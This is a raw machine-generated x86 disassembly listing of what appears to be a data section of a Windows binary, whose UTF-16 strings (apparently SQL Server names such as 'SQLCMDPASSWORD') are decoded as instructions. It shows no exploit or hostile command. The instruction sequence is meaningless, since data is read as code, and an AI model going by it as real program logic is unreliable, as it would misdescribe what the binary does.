  40a41f:	add    BYTE PTR [esi+0x0],ah
  40a422:	xor    DWORD PTR [eax],eax
  40a424:	xor    al,BYTE PTR [eax]
  40a426:	xor    DWORD PTR [eax],eax
  40a428:	arpl   WORD PTR [eax],ax
  40a42a:	xor    eax,DWORD PTR [eax]
  40a42c:	xor    eax,0x66002d00
  40a431:	add    BYTE PTR [eax],dh
  40a433:	add    BYTE PTR [ecx],bh
  40a435:	add    BYTE PTR ds:0x34002d00,dh
  40a43b:	add    BYTE PTR [edi],dh
  40a43d:	add    BYTE PTR [ecx+0x0],ah
  40a440:	popa   
  40a441:	add    BYTE PTR ds:0x63006200,ch
  40a447:	add    BYTE PTR [eax],dh
  40a449:	add    BYTE PTR [eax+eax*1],dh
  40a44c:	sub    eax,0x32006400
  40a451:	add    BYTE PTR [ecx],dh
  40a453:	add    BYTE PTR [eax+eax*1],dh
  40a456:	bound  eax,QWORD PTR [eax]
  40a458:	arpl   WORD PTR [eax],ax
  40a45a:	xor    BYTE PTR [eax],al
  40a45c:	xor    al,0x0
  40a45e:	aaa    
  40a45f:	add    BYTE PTR [edx],dh
  40a461:	add    BYTE PTR [edi],dh
  40a463:	add    BYTE PTR [ecx+0x0],ah
  40a466:	jge    0x40a468
  40a468:	push   cs
  40a469:	push   ebx
  40a46a:	add    BYTE PTR [ecx+0x0],dl
  40a46d:	dec    esp
  40a46e:	add    BYTE PTR [edx],dh
  40a470:	add    BYTE PTR [eax],dh
  40a472:	add    BYTE PTR [ecx],dh
  40a474:	add    BYTE PTR [ecx],dh
  40a476:	add    BYTE PTR [esi],cl
  40a478:	dec    ebp
  40a479:	add    BYTE PTR [ebx+0x0],dl
  40a47c:	push   ebx
  40a47d:	add    BYTE PTR [ecx+0x0],dl
  40a480:	dec    esp
  40a481:	add    BYTE PTR [ecx],dh
  40a483:	add    BYTE PTR [ecx],dh
  40a485:	add    BYTE PTR [ecx*2+0x41005300],cl
  40a48c:	add    BYTE PTR [ebx+0x0],dl
  40a48f:	xor    DWORD PTR [eax],eax
  40a491:	xor    DWORD PTR [eax],eax
  40a493:	or     al,0x4d
  40a495:	add    BYTE PTR [ebx+0x0],dl
  40a498:	push   edx
  40a499:	add    BYTE PTR [ebx+0x0],dl
  40a49c:	xor    DWORD PTR [eax],eax
  40a49e:	xor    DWORD PTR [eax],eax
  40a4a0:	add    al,BYTE PTR [esi]
  40a4a2:	or     DWORD PTR [esp+esi*4],eax
  40a4a5:	add    BYTE PTR [eax],al
  40a4a7:	add    BYTE PTR [edx],dl
  40a4a9:	push   ebx
  40a4aa:	add    BYTE PTR [ecx+0x0],dl
  40a4ad:	dec    esp
  40a4ae:	add    BYTE PTR [ecx],dh
  40a4b0:	add    BYTE PTR [ecx],dh
  40a4b2:	add    BYTE PTR [eax],dh
  40a4b4:	add    BYTE PTR [ebp+0x0],cl
  40a4b7:	push   ebx
  40a4b8:	add    BYTE PTR [ecx+0x0],cl
  40a4bb:	push   ds
  40a4bc:	push   ebx
  40a4bd:	add    BYTE PTR [ecx+0x0],dl
  40a4c0:	dec    esp
  40a4c1:	add    BYTE PTR [ecx],dh
  40a4c3:	add    BYTE PTR [ecx],dh
  40a4c5:	add    BYTE PTR [eax],dh
  40a4c7:	add    BYTE PTR [ebp+0x0],al
  40a4ca:	js     0x40a4cc
  40a4cc:	arpl   WORD PTR [eax],ax
  40a4ce:	add    BYTE PTR gs:[eax+0x0],dh
  40a4d2:	je     0x40a4d4
  40a4d4:	imul   eax,DWORD PTR [eax],0x6e006f
  40a4da:	sbb    BYTE PTR [ebx+edi*2+0x78003000],0x0
  40a4e2:	xor    al,BYTE PTR [eax]
  40a4e4:	xor    al,0x0
  40a4e6:	xor    DWORD PTR [eax],eax
  40a4e8:	xor    al,0x0
  40a4ea:	bound  eax,QWORD PTR [eax]
  40a4ec:	arpl   WORD PTR [eax],ax
  40a4ee:	xor    DWORD PTR [eax],eax
  40a4f0:	bound  eax,QWORD PTR [eax]
  40a4f2:	sub    al,0x0
  40a4f4:	and    BYTE PTR [eax],al
  40a4f6:	xor    BYTE PTR [eax],al
  40a4f8:	js     0x40a4fa
  40a4fa:	xor    DWORD PTR [eax],eax
  40a4fc:	xor    eax,0x32003700
  40a501:	add    BYTE PTR [eax+eax*1],ch
  40a504:	and    BYTE PTR [eax],al
  40a506:	xor    BYTE PTR [eax],al
  40a508:	js     0x40a50a
  40a50a:	xor    al,0x0
  40a50c:	arpl   WORD PTR [eax],ax
  40a50e:	add    BYTE PTR fs:[ecx],bh
  40a511:	add    BYTE PTR [eax+eax*1],ch
  40a514:	and    BYTE PTR [eax],al
  40a516:	jnp    0x40a518
  40a518:	xor    BYTE PTR [eax],al
  40a51a:	js     0x40a51c
  40a51c:	cmp    DWORD PTR [eax],eax
  40a51e:	arpl   WORD PTR [eax],ax
  40a520:	sub    al,0x0
  40a522:	and    BYTE PTR [eax],al
  40a524:	xor    BYTE PTR [eax],al
  40a526:	js     0x40a528
  40a528:	popa   
  40a529:	add    BYTE PTR ds:0x20002c00,dh
  40a52f:	add    BYTE PTR [eax],dh
  40a531:	add    BYTE PTR [eax+0x0],bh
  40a534:	add    BYTE PTR ss:0x20002c00,dh
  40a53b:	add    BYTE PTR [eax],dh
  40a53d:	add    BYTE PTR [eax+0x0],bh
  40a540:	xor    DWORD PTR [eax],eax
  40a542:	add    BYTE PTR ss:[eax+eax*1],ch
  40a546:	and    BYTE PTR [eax],al
  40a548:	xor    BYTE PTR [eax],al
  40a54a:	js     0x40a54c
  40a54c:	add    BYTE PTR ss:[eax+eax*1+0x2c],ah
  40a551:	add    BYTE PTR [eax],ah
  40a553:	add    BYTE PTR [eax],dh
  40a555:	add    BYTE PTR [eax+0x0],bh
  40a558:	cmp    BYTE PTR [eax],al
  40a55a:	add    BYTE PTR fs:[eax+eax*1],ch
  40a55e:	and    BYTE PTR [eax],al
  40a560:	xor    BYTE PTR [eax],al
  40a562:	js     0x40a564
  40a564:	add    BYTE PTR gs:[esi+0x0],ah
  40a568:	sub    al,0x0
  40a56a:	and    BYTE PTR [eax],al
  40a56c:	xor    BYTE PTR [eax],al
  40a56e:	js     0x40a570
  40a570:	xor    eax,DWORD PTR [eax]
  40a572:	add    BYTE PTR fs:[ebp+0x0],bh
  40a576:	jge    0x40a578
  40a578:	sub    ch,BYTE PTR [ebp+0x0]
  40a57b:	jae    0x40a57d
  40a57d:	sub    eax,0x65006800
  40a582:	add    BYTE PTR [eax+eax*1+0x70],ch
  40a586:	add    BYTE PTR [edx],bh
  40a588:	add    BYTE PTR [edi],ch
  40a58a:	add    BYTE PTR [edi],ch
  40a58c:	add    BYTE PTR [ebp+0x0],cl
  40a58f:	push   ebx
  40a590:	add    BYTE PTR [esi],ch
  40a592:	add    BYTE PTR [esi+0x0],dl
  40a595:	push   ebx
  40a596:	add    BYTE PTR [ebx+0x0],al
  40a599:	inc    ebx
  40a59a:	add    BYTE PTR [esi],ch
  40a59c:	add    BYTE PTR [esi+0x0],dh
  40a59f:	cmp    DWORD PTR [eax],eax
  40a5a1:	xor    BYTE PTR [eax],al
  40a5a3:	or     BYTE PTR [ecx],dh
  40a5a5:	add    BYTE PTR [eax],dh
  40a5a7:	add    BYTE PTR [esi],ch
  40a5a9:	add    BYTE PTR [eax],dh
  40a5ab:	add    BYTE PTR [ebx],al
  40a5ad:	add    BYTE PTR [eax],al
  40a5af:	push   cs
  40a5b0:	add    ecx,DWORD PTR [eax]
  40a5b2:	add    BYTE PTR [esi],cl
  40a5b4:	add    eax,DWORD PTR [esi]
  40a5b6:	adc    dl,BYTE PTR [ecx]
  40a5b8:	add    eax,DWORD PTR [esi]
  40a5ba:	adc    ch,BYTE PTR [eax]
  40a5bc:	or     BYTE PTR [ecx-0x7f32a27c],cl
  40a5c2:	or     ah,0x91
  40a5c5:	add    eax,DWORD PTR [esi]
  40a5c7:	adc    DWORD PTR ds:0x8010005,edx
  40a5cd:	sbb    eax,0x200070e
  40a5d2:	add    DWORD PTR [edx],edx
  40a5d4:	sub    BYTE PTR [edx],dl
  40a5d6:	sbb    DWORD PTR [edx],ecx
  40a5d8:	add    BYTE PTR [ecx+eax*1],al
  40a5db:	adc    bl,BYTE PTR [ecx]
  40a5dd:	push   cs
  40a5de:	adc    BYTE PTR [esi],cl
  40a5e0:	adc    BYTE PTR [esi],cl
  40a5e2:	push   es
  40a5e3:	add    BYTE PTR [edx],al
  40a5e5:	add    DWORD PTR [edx],edx
  40a5e7:	sbb    eax,0x2000602
  40a5ec:	add    DWORD PTR [edx+edx*1],ebx
  40a5ef:	and    DWORD PTR [esi],eax
  40a5f1:	add    BYTE PTR [edx],al
  40a5f3:	add    DWORD PTR [edx+edx*1],ebx
  40a5f6:	sbb    eax,0x1002003
  40a5fb:	sub    al,BYTE PTR [eax+eax*1+0x69]
  40a5ff:	add    BYTE PTR [ecx+0x0],ah
  40a602:	add    BYTE PTR [bp+0x0],ch
  40a606:	outs   dx,DWORD PTR ds:[esi]
  40a607:	add    BYTE PTR [ebx+0x0],dh
  40a60a:	je     0x40a60c
  40a60c:	imul   eax,DWORD PTR [eax],0x490063
  40a612:	outs   dx,BYTE PTR ds:[esi]
  40a613:	add    BYTE PTR [esi+0x0],ah
  40a616:	outs   dx,DWORD PTR ds:[esi]
  40a617:	add    BYTE PTR [edx+0x0],dh
  40a61a:	ins    DWORD PTR es:[edi],dx
  40a61b:	add    BYTE PTR [ecx+0x0],ah
  40a61e:	je     0x40a620
  40a620:	imul   eax,DWORD PTR [eax],0x6e006f
  40a626:	or     al,0x42
  40a628:	add    BYTE PTR [ecx+0x0],ah
  40a62b:	outs   dx,BYTE PTR ds:[esi]
  40a62c:	add    BYTE PTR [esi+0x0],ch
  40a62f:	add    BYTE PTR gs:[edx+0x0],dh
  40a633:	push   cs
  40a634:	jo     0x40a636
  40a636:	jb     0x40a638
  40a638:	outs   dx,DWORD PTR ds:[esi]
  40a639:	add    BYTE PTR [eax+eax*1+0x75],ah
  40a63d:	add    BYTE PTR [ebx+0x0],ah
  40a640:	je     0x40a642
  40a642:	or     dh,BYTE PTR [eax+eax*1+0x69]
  40a646:	add    BYTE PTR [eax+eax*1+0x6c],dh
  40a64a:	add    BYTE PTR [ebp+0x0],ah
  40a64d:	push   cs
  40a64e:	jbe    0x40a650
  40a650:	add    BYTE PTR gs:[edx+0x0],dh
  40a654:	jae    0x40a656
  40a656:	imul   eax,DWORD PTR [eax],0x6e006f
  40a65c:	or     cl,BYTE PTR [ecx+0x0]
  40a65f:	jae    0x40a661
  40a661:	jae    0x40a663
  40a663:	jne    0x40a665
  40a665:	add    BYTE PTR gs:[eax],cl
  40a668:	arpl   WORD PTR [eax],ax
  40a66a:	outs   dx,DWORD PTR ds:[esi]
  40a66b:	add    BYTE PTR [eax+eax*1+0x65],ah
  40a66f:	add    BYTE PTR [edx],cl
  40a671:	ins    BYTE PTR es:[edi],dx
  40a672:	add    BYTE PTR [ebp+0x0],ah
  40a675:	jbe    0x40a677
  40a677:	add    BYTE PTR gs:[eax+eax*1+0x8],ch
  40a67c:	je     0x40a67e
  40a67e:	jns    0x40a680
  40a680:	jo     0x40a682
  40a682:	add    BYTE PTR gs:[eax],dl
  40a685:	jae    0x40a687
  40a687:	add    BYTE PTR gs:[esi+0x0],dh
  40a68b:	add    BYTE PTR gs:[edx+0x0],dh
  40a68f:	imul   eax,DWORD PTR [eax],0x790074
  40a695:	or     al,0x73
  40a697:	add    BYTE PTR [ebp+0x0],ah
  40a69a:	jb     0x40a69c
  40a69c:	jbe    0x40a69e
  40a69e:	add    BYTE PTR gs:[edx+0x0],dh
  40a6a2:	adc    BYTE PTR [eax+eax*1+0x61],ah
  40a6a6:	add    BYTE PTR [eax+eax*1+0x61],dh
  40a6aa:	add    BYTE PTR [edx+0x0],ah
  40a6ad:	popa   
  40a6ae:	add    BYTE PTR [ebx+0x0],dh
  40a6b1:	add    BYTE PTR gs:[edi+ebp*2],cl
  40a6b5:	add    BYTE PTR [edx+0x0],ah
  40a6b8:	push   0x0
  40a6ba:	add    BYTE PTR gs:[ebx+0x0],ah
  40a6be:	je     0x40a6c0
  40a6c0:	or     ah,BYTE PTR [ebp+0x0]
  40a6c3:	jb     0x40a6c5
  40a6c5:	jb     0x40a6c7
  40a6c7:	outs   dx,DWORD PTR ds:[esi]
  40a6c8:	add    BYTE PTR [edx+0x0],dh
  40a6cb:	push   cs
  40a6cc:	ja     0x40a6ce
  40a6ce:	popa   
  40a6cf:	add    BYTE PTR [edx+0x0],dh
  40a6d2:	outs   dx,BYTE PTR ds:[esi]
  40a6d3:	add    BYTE PTR [ecx+0x0],ch
  40a6d6:	outs   dx,BYTE PTR ds:[esi]
  40a6d7:	add    BYTE PTR [edi+0x0],ah
  40a6da:	add    eax,DWORD PTR [esi]
  40a6dc:	adc    dl,BYTE PTR [esp+eax*1+0x20]
  40a6e0:	add    BYTE PTR [edx],dl
  40a6e2:	push   esp
  40a6e3:	push   es
  40a6e4:	push   es
  40a6e5:	adc    eax,0xe012412
  40a6ea:	pop    es
  40a6eb:	and    BYTE PTR [eax],al
  40a6ed:	adc    eax,0xe012412
  40a6f2:	add    al,0x28
  40a6f4:	add    BYTE PTR [edx],dl
  40a6f6:	push   esp
  40a6f7:	pop    es
  40a6f8:	sub    BYTE PTR [eax],al
  40a6fa:	adc    eax,0xe012412
  40a6ff:	add    al,BYTE PTR [esi]
  40a701:	add    al,BYTE PTR [ebx]
  40a703:	and    BYTE PTR [eax],al
  40a705:	add    al,BYTE PTR [eax+eiz*1]
  40a708:	add    DWORD PTR [ecx],eax
  40a70a:	add    al,BYTE PTR [esi]
  40a70c:	push   es
  40a70d:	adc    eax,0x2012412
  40a712:	pop    es
  40a713:	and    BYTE PTR [eax],al
  40a715:	adc    eax,0x2012412
  40a71a:	push   es
  40a71b:	push   es
  40a71c:	adc    eax,0x8012412
  40a721:	pop    es
  40a722:	and    BYTE PTR [eax],al
  40a724:	adc    eax,0x8012412
  40a729:	add    ebp,DWORD PTR [eax]
  40a72b:	add    BYTE PTR [edx],al
  40a72d:	pop    es
  40a72e:	sub    BYTE PTR [eax],al
  40a730:	adc    eax,0x2012412
  40a735:	pop    es
  40a736:	sub    BYTE PTR [eax],al
  40a738:	adc    eax,0x8012412
  40a73d:	add    eax,DWORD PTR [esi]
  40a73f:	adc    bl,BYTE PTR [eax]
  40a741:	add    al,0x20
  40a743:	add    BYTE PTR [edx],dl
  40a745:	sbb    BYTE PTR [edi],al
  40a747:	push   es
  40a748:	adc    eax,0x8022512
  40a74d:	add    al,BYTE PTR [eax+eiz*1]
  40a750:	add    DWORD PTR [ecx],eax
  40a752:	or     BYTE PTR [eax+eiz*1],al
  40a755:	add    DWORD PTR [edx],eax
  40a757:	or     BYTE PTR [eax+ebp*1],al
  40a75a:	add    BYTE PTR [edx],dl
  40a75c:	sbb    BYTE PTR [ebx],al
  40a75e:	push   es
  40a75f:	adc    eax,DWORD PTR [eax]
  40a761:	add    al,0x20
  40a763:	add    BYTE PTR [ebx],dl
  40a765:	add    BYTE PTR ds:0x13010120,al
  40a76b:	add    BYTE PTR [ebx],al
  40a76d:	and    BYTE PTR [eax],al
  40a76f:	push   cs
  40a770:	add    al,0x28
  40a772:	add    BYTE PTR [ebx],dl
  40a774:	add    BYTE PTR [ebx+edx*2],bl
  40a777:	add    BYTE PTR [ecx+0x0],dl
  40a77a:	dec    esp
  40a77b:	add    BYTE PTR [ebx+0x0],al
  40a77e:	dec    ebp
  40a77f:	add    BYTE PTR [eax+eax*1+0x50],al
  40a783:	add    BYTE PTR [ecx+0x0],al
  40a786:	push   ebx
  40a787:	add    BYTE PTR [ebx+0x0],dl
  40a78a:	push   edi
  40a78b:	add    BYTE PTR [edi+0x0],cl
  40a78e:	push   edx
  40a78f:	add    BYTE PTR [eax+eax*1+0x18],al
  40a793:	push   ebx
  40a794:	add    BYTE PTR [ecx+0x0],dl
  40a797:	dec    esp
  40a798:	add    BYTE PTR [ebx+0x0],al
  40a79b:	dec    ebp
  40a79c:	add    BYTE PTR [eax+eax*1+0x53],al
  40a7a0:	add    BYTE PTR [ebp+0x0],al
  40a7a3:	push   edx
  40a7a4:	add    BYTE PTR [esi+0x0],dl
  40a7a7:	inc    ebp
  40a7a8:	add    BYTE PTR [edx+0x0],dl
  40a7ab:	and    al,0x53
  40a7ad:	add    BYTE PTR [ecx+0x0],dl
  40a7b0:	dec    esp
  40a7b1:	add    BYTE PTR [ebx+0x0],al
  40a7b4:	dec    ebp
  40a7b5:	add    BYTE PTR [eax+eax*1+0x4c],al
  40a7b9:	add    BYTE PTR [edi+0x0],cl
  40a7bc:	inc    edi
  40a7bd:	add    BYTE PTR [ecx+0x0],cl
  40a7c0:	dec    esi
  40a7c1:	add    BYTE PTR [eax+eax*1+0x49],dl
  40a7c5:	add    BYTE PTR [ebp+0x0],cl
  40a7c8:	inc    ebp
  40a7c9:	add    BYTE PTR [edi+0x0],cl
  40a7cc:	push   ebp
  40a7cd:	add    BYTE PTR [eax+eax*1+0x4],dl
  40a7d1:	idiv   bh
  40a7d3:	(bad)  
  40a7d4:	inc    DWORD PTR [esp+eax*1]
  40a7d7:	add    BYTE PTR [eax],al
  40a7d9:	add    BYTE PTR [eax+eax*1],al
  40a7dc:	add    DWORD PTR [eax],ebx
  40a7de:	or     DWORD PTR [esi],eax
  40a7e0:	add    BYTE PTR [edx],al
  40a7e2:	add    bl,BYTE PTR [eax]
  40a7e4:	wbinvd 
  40a7e6:	add    eax,0x18020200
  40a7eb:	or     DWORD PTR [edi],eax
  40a7ed:	add    BYTE PTR [edx],al
  40a7ef:	push   cs
  40a7f0:	adc    bl,BYTE PTR [eax]
  40a7f2:	adc    bl,BYTE PTR [eax]
  40a7f4:	or     BYTE PTR [eax],al
  40a7f6:	add    ecx,DWORD PTR [esi]
  40a7f8:	push   cs
  40a7f9:	adc    bl,BYTE PTR [eax]
  40a7fb:	adc    bl,BYTE PTR [eax]
  40a7fd:	add    al,0x6
  40a7ff:	sbb    eax,0x20074811
  40a804:	add    al,BYTE PTR [edx]
  40a806:	push   cs
  40a807:	adc    BYTE PTR [ecx],dl
  40a809:	inc    esp
  40a80a:	add    eax,DWORD PTR [esi]
  40a80c:	adc    ah,BYTE PTR [eax]
  40a80e:	add    al,0x20
  40a810:	add    BYTE PTR [edx],dl
  40a812:	and    BYTE PTR [ebx],al
  40a814:	push   es
  40a815:	adc    dl,BYTE PTR [esp+eax*1]
  40a818:	and    BYTE PTR [eax],al
  40a81a:	adc    dl,BYTE PTR [ebx+eax*1]
  40a81d:	push   es
  40a81e:	adc    dl,BYTE PTR [eax+0x4]
  40a821:	and    BYTE PTR [eax],al
  40a823:	adc    dl,BYTE PTR [eax+0x7]
  40a826:	push   es
  40a827:	adc    eax,0x11012412
  40a82c:	dec    esp
  40a82d:	or     BYTE PTR [eax],ah
  40a82f:	add    BYTE PTR ds:0x11012412,dl
  40a835:	dec    esp
  40a836:	add    eax,0x1d010120
  40a83b:	push   cs
  40a83c:	adc    ah,BYTE PTR [eax]
  40a83e:	push   es
  40a83f:	add    DWORD PTR [esi],ecx
  40a841:	adc    DWORD PTR [eax+edx*1+0x11],eax
  40a845:	sub    al,0x10
  40a847:	adc    DWORD PTR [eax+edx*1],edi
  40a84a:	adc    DWORD PTR [eax+edx*1],esi
  40a84d:	adc    bl,BYTE PTR [eax]
  40a84f:	mov    ebp,cr0
  40a852:	add    DWORD PTR [esi],ecx
  40a854:	adc    DWORD PTR [eax+edx*1+0x11],eax
  40a858:	sub    al,0x10
  40a85a:	adc    DWORD PTR [eax],edi
  40a85c:	adc    BYTE PTR [ecx],dl
  40a85e:	xor    al,0x8
  40a860:	and    BYTE PTR [ebx],al
  40a862:	add    DWORD PTR [ecx],edx
  40a864:	inc    esp
  40a865:	adc    DWORD PTR [esi+ecx*1+0xf],eax
  40a869:	and    BYTE PTR ds:0x44110e01,al
  40a86f:	adc    BYTE PTR [ecx],dl
  40a871:	sub    al,0x10
  40a873:	adc    DWORD PTR [eax],esi
  40a875:	adc    BYTE PTR [ecx],dl
  40a877:	xor    al,0xb
  40a879:	and    BYTE PTR [edx+eax*1],al
  40a87c:	push   cs
  40a87d:	adc    DWORD PTR [eax+edx*1+0x11],eax
  40a881:	xor    al,0x12
  40a883:	sbb    BYTE PTR [ebx],al
  40a885:	sub    BYTE PTR [eax],al
  40a887:	push   cs
  40a888:	add    al,0x28
  40a88a:	add    BYTE PTR [edx],dl
  40a88c:	and    BYTE PTR [eax+ebp*1],al
  40a88f:	add    BYTE PTR [edx],dl
  40a891:	adc    al,0x4
  40a893:	sub    BYTE PTR [eax],al
  40a895:	adc    dl,BYTE PTR [eax+0x8]
  40a898:	sub    BYTE PTR [eax],al
  40a89a:	adc    eax,0x11012412
  40a89f:	dec    esp
  40a8a0:	add    eax,DWORD PTR [esi]
  40a8a2:	adc    DWORD PTR [esp+eax*1],ebp
  40a8a5:	add    DWORD PTR [eax],eax
  40a8a7:	add    BYTE PTR [eax],al
  40a8a9:	add    al,0x2
  40a8ab:	add    BYTE PTR [eax],al
  40a8ad:	add    BYTE PTR [ebx+eax*1],al
  40a8b0:	add    BYTE PTR [eax],al
  40a8b2:	add    BYTE PTR [ebx],al
  40a8b4:	push   es
  40a8b5:	adc    DWORD PTR [eax],esi
  40a8b7:	add    eax,DWORD PTR [esi]
  40a8b9:	adc    DWORD PTR [esp+eax*1],esi
  40a8bc:	add    eax,0x3000000
  40a8c1:	push   es
  40a8c2:	adc    DWORD PTR [eax],edi
  40a8c4:	add    al,0x6
  40a8c6:	add    BYTE PTR [eax],al
  40a8c8:	add    BYTE PTR [edi+eax*1],al
  40a8cb:	add    BYTE PTR [eax],al
  40a8cd:	add    BYTE PTR [eax+ecx*1],al
  40a8d0:	add    BYTE PTR [eax],al
  40a8d2:	add    BYTE PTR [ecx+ecx*1],al
  40a8d5:	add    BYTE PTR [eax],al
  40a8d7:	add    BYTE PTR [edx+ecx*1],al
  40a8da:	add    BYTE PTR [eax],al
  40a8dc:	add    BYTE PTR [esp+ecx*1],al
  40a8df:	add    BYTE PTR [eax],al
  40a8e1:	add    BYTE PTR [ecx*1+0x4000000],al
  40a8e8:	push   cs
  40a8e9:	add    BYTE PTR [eax],al
  40a8eb:	add    BYTE PTR [edi+ecx*1],al
  40a8ee:	add    BYTE PTR [eax],al
  40a8f0:	add    BYTE PTR [eax+edx*1],al
  40a8f3:	add    BYTE PTR [eax],al
  40a8f5:	add    BYTE PTR [ebx],al
  40a8f7:	push   es
  40a8f8:	adc    DWORD PTR [edx+eax*1],edi
  40a8fb:	das    
  40a8fc:	add    BYTE PTR [edx],al
  40a8fe:	sub    eax,0x580600
  40a903:	dec    ebp
  40a904:	add    BYTE PTR [eax+eax*1+0xa],cl
  40a908:	dec    esp
  40a909:	add    BYTE PTR [ebp+0x0],al
  40a90c:	push   esi
  40a90d:	add    BYTE PTR [ebp+0x0],al
  40a910:	dec    esp
  40a911:	add    BYTE PTR [edx],cl
  40a913:	inc    ebp
  40a914:	add    BYTE PTR [edx+0x0],dl
  40a917:	push   edx
  40a918:	add    BYTE PTR [edi+0x0],cl
  40a91b:	push   edx
  40a91c:	add    BYTE PTR [esi],cl
  40a91e:	push   edi
  40a91f:	add    BYTE PTR [ecx+0x0],al
  40a922:	push   edx
  40a923:	add    BYTE PTR [esi+0x0],cl
  40a926:	dec    ecx
  40a927:	add    BYTE PTR [esi+0x0],cl
  40a92a:	inc    edi
  40a92b:	add    BYTE PTR [eax],cl
  40a92d:	dec    ecx
  40a92e:	add    BYTE PTR [esi+0x0],cl
  40a931:	inc    esi
  40a932:	add    BYTE PTR [edi+0x0],cl
  40a935:	add    al,BYTE PTR [ebp+0x0]
  40a938:	add    dl,BYTE PTR [ebp+0x0]
  40a93b:	add    dl,BYTE PTR [eax+0x0]
  40a93e:	add    dl,BYTE PTR [ebx+0x0]
  40a941:	add    ah,BYTE PTR [eax+eax*1+0x2]
  40a945:	ins    BYTE PTR es:[edi],dx
  40a946:	add    BYTE PTR [edx],bl
  40a948:	inc    ebx
  40a949:	add    BYTE PTR [edi+0x0],cl
  40a94c:	dec    esi
  40a94d:	add    BYTE PTR [esi+0x0],al
  40a950:	dec    ecx
  40a951:	add    BYTE PTR [edi+0x0],al
  40a954:	push   ebp
  40a955:	add    BYTE PTR [edx+0x0],dl
  40a958:	inc    ecx
  40a959:	add    BYTE PTR [eax+eax*1+0x49],dl
  40a95d:	add    BYTE PTR [edi+0x0],cl
  40a960:	dec    esi
  40a961:	add    BYTE PTR [eax],cl
  40a963:	inc    esi
  40a964:	add    BYTE PTR [edx+0x0],dl
  40a967:	dec    edi
  40a968:	add    BYTE PTR [ebp+0x0],cl
  40a96b:	add    al,0x54
  40a96d:	add    BYTE PTR [edi+0x0],cl
  40a970:	push   cs
  40a971:	push   ebx
  40a972:	add    BYTE PTR [ebp+0x0],al
  40a975:	push   edx
  40a976:	add    BYTE PTR [esi+0x0],dl
  40a979:	dec    ecx
  40a97a:	add    BYTE PTR [ebx+0x0],al
  40a97d:	inc    ebp
  40a97e:	add    BYTE PTR [eax],dl
  40a980:	inc    ebx
  40a981:	add    BYTE PTR [edi+0x0],cl
  40a984:	dec    esi
  40a985:	add    BYTE PTR [eax+eax*1+0x52],dl
  40a989:	add    BYTE PTR [ecx+0x0],al
  40a98c:	inc    ebx
  40a98d:	add    BYTE PTR [eax+eax*1+0xc],dl
  40a991:	dec    ebp
  40a992:	add    BYTE PTR [ecx+0x0],cl
  40a995:	push   edx
  40a996:	add    BYTE PTR [edx+0x0],dl
  40a999:	dec    edi
  40a99a:	add    BYTE PTR [edx+0x0],dl
  40a99d:	adc    al,0x45
  40a99f:	add    BYTE PTR [esi+0x0],cl
  40a9a2:	inc    ebx
  40a9a3:	add    BYTE PTR [edx+0x0],dl
  40a9a6:	pop    ecx
  40a9a7:	add    BYTE PTR [eax+0x0],dl
  40a9aa:	push   esp
  40a9ab:	add    BYTE PTR [ecx+0x0],cl
  40a9ae:	dec    edi
  40a9af:	add    BYTE PTR [esi+0x0],cl
  40a9b2:	add    al,0x4f
  40a9b4:	add    BYTE PTR [esi+0x0],cl
  40a9b7:	push   es
  40a9b8:	dec    edi
  40a9b9:	add    BYTE PTR [esi+0x0],al
  40a9bc:	inc    esi
  40a9bd:	add    BYTE PTR [edx],dl
  40a9bf:	inc    ecx
  40a9c0:	add    BYTE PTR [esi+0x0],cl
  40a9c3:	dec    edi
  40a9c4:	add    BYTE PTR [esi+0x0],cl
  40a9c7:	pop    ecx
  40a9c8:	add    BYTE PTR [ebp+0x0],cl
  40a9cb:	dec    edi
  40a9cc:	add    BYTE PTR [ebp+0x0],dl
  40a9cf:	push   ebx
  40a9d0:	add    BYTE PTR [edx],al
  40a9d2:	sub    al,0x0
  40a9d4:	push   cs
  40a9d5:	push   edx
  40a9d6:	add    BYTE PTR [ebp+0x0],dl
  40a9d9:	dec    esi
  40a9da:	add    BYTE PTR [eax+eax*1+0x49],dl
  40a9de:	add    BYTE PTR [ebp+0x0],cl
  40a9e1:	inc    ebp
  40a9e2:	add    BYTE PTR [edx],al
  40a9e4:	aas    
  40a9e5:	add    BYTE PTR [esi],al
  40a9e7:	dec    esi
  40a9e8:	add    BYTE PTR [ebp+0x0],al
  40a9eb:	push   edi
  40a9ec:	add    BYTE PTR [ecx+ecx*2],al
  40a9ef:	add    BYTE PTR [eax+eax*1+0xe],al
  40a9f3:	inc    ebx
  40a9f4:	add    BYTE PTR [edi+0x0],cl
  40a9f7:	dec    esi
  40a9f8:	add    BYTE PTR [esi+0x0],cl
  40a9fb:	inc    ebp
  40a9fc:	add    BYTE PTR [ebx+0x0],al
  40a9ff:	push   esp
  40aa00:	add    BYTE PTR [esi],cl
  40aa02:	push   esp
  40aa03:	add    BYTE PTR [ecx+0x0],cl
  40aa06:	dec    ebp
  40aa07:	add    BYTE PTR [ebp+0x0],al
  40aa0a:	dec    edi
  40aa0b:	add    BYTE PTR [ebp+0x0],dl
  40aa0e:	push   esp
  40aa0f:	add    BYTE PTR [ecx+ecx*2],cl
  40aa12:	add    BYTE PTR [edi+0x0],al
  40aa15:	dec    esi
  40aa16:	add    BYTE PTR [edi+0x0],cl
  40aa19:	push   edx
  40aa1a:	add    BYTE PTR [ebp+0x0],al
  40aa1d:	adc    al,0x53
  40aa1f:	add    BYTE PTR [eax+0x0],cl
  40aa22:	dec    edi
  40aa23:	add    BYTE PTR [edi+0x0],dl
  40aa26:	inc    ebp
  40aa27:	add    BYTE PTR [esi+0x0],dl
  40aa2a:	inc    ebp
  40aa2b:	add    BYTE PTR [esi+0x0],cl
  40aa2e:	push   esp
  40aa2f:	add    BYTE PTR [ebx+0x0],dl
  40aa32:	add    eax,DWORD PTR [esi]
  40aa34:	adc    DWORD PTR [esp+eax*1+0x11],eax
  40aa38:	add    BYTE PTR [eax],al
  40aa3a:	add    BYTE PTR [edx+edx*1],al
  40aa3d:	add    BYTE PTR [eax],al
  40aa3f:	add    BYTE PTR [ebx+edx*1],al
  40aa42:	add    BYTE PTR [eax],al
  40aa44:	add    BYTE PTR [esp+edx*1],al
  40aa47:	add    BYTE PTR [eax],al
  40aa49:	add    BYTE PTR [edx*1+0x4000000],al
  40aa50:	push   ss
  40aa51:	add    BYTE PTR [eax],al
  40aa53:	add    BYTE PTR [edi+edx*1],al
  40aa56:	add    BYTE PTR [eax],al
  40aa58:	add    BYTE PTR [eax+ebx*1],al
  40aa5b:	add    BYTE PTR [eax],al
  40aa5d:	add    BYTE PTR [ecx+ebx*1],al
  40aa60:	add    BYTE PTR [eax],al
  40aa62:	add    BYTE PTR [edx+ebx*1],al
  40aa65:	add    BYTE PTR [eax],al
